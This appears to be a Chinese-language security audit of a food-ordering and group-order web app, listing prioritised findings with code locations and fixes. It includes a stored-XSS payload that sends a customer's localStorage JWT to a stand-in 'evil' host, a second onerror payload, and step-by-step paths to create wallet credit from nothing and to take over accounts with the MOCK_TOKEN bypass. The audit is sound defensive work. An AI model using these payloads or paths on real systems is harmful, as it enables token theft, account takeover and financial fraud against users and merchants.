## P0-1 儲存型 XSS：店家可控欄位未轉義直達顧客首頁

**現象**
`Customer/index.html` 用 `storeContainer.innerHTML = stores.map(...)` 直接組字串，店家名稱與封面網址**沒有經過任何轉義**：

```js
// frontend/Customer/index.html:865-869
<img src="${store.coverUrl || 'images/store-placeholder.svg'}"
     alt="${store.storeName || store.name || '店家封面'}"
// frontend/Customer/index.html:894
<h3 class="font-extrabold text-lg truncate">${store.name || store.storeName}</h3>
```

**資料流（完整可達）**
1. 資料來源：`GET /api/stores/nearby`（`permitAll`，見 `SecurityConfig` 公開清單）→ `PublicService.buildStoreCard` 內含 `coverUrl`／`storeName`。
2. 寫入端**完全沒有驗證**：`StoreRequest.coverUrl` 直接落地（`StoreService.java:164,207,288`）；建立門市時亦可帶入（`BrandService.createStore` 參數 `coverUrl`）。
3. 攻擊者取得帳號的成本極低：`POST /api/brand-auth/register` 是**公開**端點（無手機／信箱驗證），取得 BRAND 身分後 `POST /api/brand-auth/create-store`（`hasAuthority("BRAND")`）即可建立門市並指定 `coverUrl`；再把門市 `status` 設成 `active`（`PUT /api/stores/status` 不檢查值）就會出現在顧客首頁。

**影響**
`coverUrl = x" onerror="fetch('https://evil/?t='+localStorage.getItem('token'))` 會讓 `<img src="x" onerror=...>` 在**每一位造訪首頁的顧客**瀏覽器上執行。JWT 就存在 `localStorage`（`NavAuth`），效期 24 小時 → 可完整冒用該顧客（錢包、優惠券、個資、下單）。目前**沒有任何 CSP**（見 C-3），inline handler 不會被擋。

**同型未修的位置**（同一輪已在 `Customer/js/store-list.js` 補上 `escapeHtml`，但這幾支沒跟上）
- `frontend/Customer/search_result.html:398,400,421,427`（`coverUrl`、`storeName`、`brandLogoUrl`、`brandName`）
- `frontend/Customer/orders.html:347,361`（`order.storeName`）
- `frontend/Customer/order_confirm.html:643`（`logoMap[pid]` 進 `src="..."`）
- `frontend/Customer/profile.html:962`（`c.name`，品牌可控的優惠券名稱）

**建議**
1. 全站 HTML 組字串一律走既有 `escapeHtml`（含屬性值），或改用 `textContent`／`dataset`。
2. 後端對 `coverUrl`／`logoUrl`／`picUrl` 做白名單驗證（僅允許 `https://` 或站內 `/uploads/`，拒絕 `"`、`<`、`>` 等字元）。
3. 補上 CSP（`default-src 'self'`，逐步收斂 inline script），讓這類漏洞有第二層攔阻。

## P0-2 團員取消品項 → 憑空產生團長錢包餘額

**現象**
`GroupOrderService.cancelMemberItems()` 對「非 PAID」品項一律把金額加到 `hostRefundAmount`，最後**無條件**退給團長：

```java
// GroupOrderService.java:931-958
if ("PAID".equalsIgnoreCase(mItem.getPaymentStatus())) {
    transactionRecordService.updateStoreCredit(mItem.getUser().getId(), itemTotal, REFUND, ...);
} else {
    hostRefundAmount = hostRefundAmount.add(itemTotal);   // 939
}
...
if (hostRefundAmount.compareTo(BigDecimal.ZERO) > 0) {
    transactionRecordService.updateStoreCredit(go.getInitiator().getId(), hostRefundAmount, REFUND, ...); // 950
```

**可達路徑**
`PUT /api/orders/{orderId}/cancel/v2`（CUSTOMER）：訂單為 `OPEN` 或 `SUBMITTED` 時，非發起人的成員走 `cancelMemberItems`（`OrderController.java:578-583`）。而揪團**還沒結帳**（`status=OPEN`）時，團長從未被扣任何一筆錢（`escrowAmount` 為 0／null），成員的品項也還是 `UNPAID`。

**影響**
- 兩個帳號（團長＋成員，成員用分享 token 加入即可）就能把「品項金額」直接變成團長的錢包餘額，且可重複執行（新增品項 → 取消 → 再新增），金額無上限（單品 `qty` 上限 99）。錢包餘額可用於下單，等同免費購物。
- 副作用：品項被實體刪除、`totalAmount` 被扣減，門市端看到的訂單與實際內容不一致；帳本會出現一筆沒有對應付款的 `REFUND`，破壞對帳。

**附帶瑕疵（同一方法）**
- 退款給團長時用的是**未扣折扣**的 `finalPrice`，而成員自己 PAID 的退款卻用 `finalPrice - discountAmountSnapshot`（`:936`）。帶券的品項在團長已結帳（ESCROWED）情況下被取消，會**多退折扣金額**給團長。
- 沒有任何「此品項是否已由團長代墊」的前置條件，`escrowAmount` 只是用 `max(0)` 夾住（`:955`），超出的部分直接變成淨增餘額。

**建議**
先鎖列讀取揪團，並依實際金流狀態決定退款：
1. 只有 `paymentStatus = ESCROWED`（團長確實代墊過）才退團長，金額用 `finalPrice - discount`；
2. `UNPAID` 品項取消只改狀態／刪除，**不產生任何餘額異動**；
3. 退款金額以 `escrowAmount` 為上限，並在同一交易內同步更新 `totalAmount`／`escrowAmount`。

## P1-1 `cancelMemberItems` 缺列鎖：併發重複退款

`:920` 用的是 `groupOrderRepository.findById()`、`:922` 用 `orderItemRepository.findByGroupOrderId()`——兩者都**沒有** `FOR UPDATE`。同一個成員同時送出多個 `cancel/v2`，每個交易都會讀到同一批 `PAID` 品項並各退一次；非 PAID 的 `hostRefundAmount` 也會重複退給團長。

這與專案自己已建立的標準不一致：`checkout`（`findByShareTokenForUpdate`）、`getMemberUnpaidTotalAndMarkPaid`（`findByGroupOrderAndUserAndStatusForUpdate`）、`repayToHost`、`handleGroupOrderCancellation`（`findByIdForUpdate` + `findByGroupOrderIdForUpdate`）都已鎖列並由 `GroupCheckoutConcurrencyTest` 守住，只有這條路徑漏掉，也沒有對應測試。

**建議**：改用 `findByIdForUpdate` ＋ `findByGroupOrderIdForUpdate`，並補一個「同成員 N 個併發取消只退一次」的測試。

## P1-2 `sms.mode` 預設 mock 且缺 prod 防呆 → 任意帳號接管

```yaml
# application.yml:70
sms:
  mode: ${SMS_MODE:mock}      # 預設 mock
```

```java
// AuthService.java:307
if ("mock".equalsIgnoreCase(smsMode) && "MOCK_TOKEN".equals(idToken)) return null;   // 視為已驗證
```

`verifyFirebasePhone()`（`:274`）在拿到 `null` 時**直接回傳使用者送來的手機號碼**當作已驗證，於是任何公開端點都能用 `idToken = "MOCK_TOKEN"` 通過手機驗證：

| 端點 | 後果 |
|------|------|
| `POST /api/auth/reset-password-firebase` | 用他人手機號碼重設密碼 → **接管該顧客帳號** |
| `POST /api/auth/merge/set-password` | 同上（無密碼的三方帳號可直接設定密碼） |
| `POST /api/auth/merge/complete`、`merge/bind-social-phone` | 把攻擊者的社群帳號綁到他人手機帳號 |
| `POST /api/auth/register` | 不用 OTP 即可註冊任意號碼 |
| `POST /api/auth/social-login` | `providerUid` 為可預測的 `MOCK_UID_<PROVIDER>_<phone>`（`AuthService` `mockProviderUid`），可偽造三方身分 |

**問題核心是「不一致的預設值」**：同一份設定檔中，另外兩個同等敏感的開關都做了 fail-closed 設計——
- `jwt.secret`：prod profile 下若仍是內建值，`JwtUtils.initSigningKey()` 直接讓啟動失敗；
- `app.wallet.mock-top-up.enabled`：預設 `false`，且 `UserProfileService.topUpUser()` 在 prod profile 一律 `403`。

只有 `sms.mode` 兩者皆無：預設是 `mock`（OPEN），且 `AuthService` 完全不看 profile。`.env.prod.example` 雖然寫了 `SMS_MODE=firebase`，但那是仰賴操作者記得覆寫；只要正式部署漏了這一行，上述五條路徑立刻全部開放。

**建議**
1. 比照錢包的做法：`sms.mode` 加上 prod profile 防呆（prod 且非 `firebase` → 啟動失敗）；或在 prod 下直接停用 `MOCK_TOKEN` 分支。
2. `verifyFirebasePhone()` 在 mock 模式下也應要求 `MOCK_TOKEN` 只作用於本機 profile。
3. 理想上把預設改為 `firebase`（安全的失敗方向），讓本機開發明確設定 `sms.mode=mock`。

## P1-3 顧客可控資料未轉義，直進門市後台 DOM

```js
// frontend/store/js/api-home.js:19-21
const note = i.note ? ` ... ${i.note}</span>` : '';
const user = i.userName ? ` ... 【${i.userName}】</span>` : '';
return `... ${name}</span>${specsPart}${note}${user}`;   // → container.innerHTML
```

`userName` 來自 `AnalyticsService.java:395`（`i.getUser().getName()`）、`note` 來自品項／訂單備註；而顧客姓名**沒有任何驗證或長度限制**（`UpdateUserRequest` 無 `@Valid` 約束、`AuthService.update()` 直接 `setName`）。顧客只要把名字改成 `<img src=x onerror=...>`，門市後台首頁／訂單彈窗就會執行它 → 以**門市身分**操作（接單、拒單、庫存、財務報表）。

- `store/js/api-home.js:19-21`
- `store/js/home-order-modals.js:21-22`
- `store/js/api-analytics.js:44,64,76`
- `store/js/api-home-metrics.js:50`

**建議**：把 `escapeHtml` 抽成門市後台共用的單一小工具（例如掛在 `store-shell.js` 上或獨立一支 `store/js/escape.js`）並全面套用；後端對 `users.name`、`order.note` 加上長度上限與字元白名單。

## P2 群

**C-1 訂單狀態無狀態機驗證。** `OrderService.updateOrderStatusWithUserCheck()` 只驗「是否為發起人」，之後 `order.setStatus(status)` 直接寫入、無白名單（`:112-118`）。可達的濫用：
- 自行設為 `COMPLETED` → 繞過門市流程後立刻評分（`OrderRatingService.upsertRating` 要求 `COMPLETED`，`:56`），污染 `stores.avg_rating`；
- 把已結帳的 `SUBMITTED` 改回 `OPEN` → 揪團重新開放加點並可再次 `checkout`（`checkout` 的守衛只看 `OPEN/LOCKED`），造成重複扣款與 `escrowAmount` 覆寫；
- 送 `status=PAID` → 觸發「通知門市已付款」推播（`OrderController.java:536-546`），現金單可偽造付款狀態。
建議：把 `STATUS_TRANSITIONS` 白名單集中在 Service，並限制顧客端僅能 `CANCELLED`。

**C-2 無速率限制。** 全 repo 沒有任何 rate limit 實作（`Bucket4j`／`resilience4j`／嘗試次數欄位皆為 0 筆）。`/api/auth/login`、`/api/brand-auth/login`、`/api/stores/auth/login`、`/api/auth/check-phone` 皆為公開且無限次；密碼規則為 8–16 字元，線上爆破可行。另外 `check-phone` 直接回傳號碼是否註冊（帳號列舉），`customerLogin` 也以 `404 帳號不存在`／`401 密碼錯誤` 區分。建議：登入與 OTP 端點加滑動視窗限流＋失敗計數鎖定（Redis 已在架構中，可直接用）。

**C-3 無安全標頭。** `SecurityConfig` 的 filter chain 未設定 `headers(...)`，前端也沒有 CSP meta：沒有 CSP、`X-Frame-Options`／`frame-ancestors`（可被 iframe 點擊劫持）、`X-Content-Type-Options`、HSTS。這也是 X-1／X-2 的直接放大器。建議至少先上 CSP 與 `X-Content-Type-Options: nosniff`。

**C-4 示範帳號預設開啟且無程式層防呆。** `app.demo-data.enabled` 預設 `true`（`application.yml:81`），`DemoDataSeeder` 建立密碼固定為 `demo1234` 的顧客／品牌／門市帳號（`:57,130,302,348`）。`application-prod.yml.example` 有雙保險設定，但那是要操作者主動複製的檔案；與 A-1 相同，建議在 `DemoDataSeeder` 內直接檢查 prod profile。
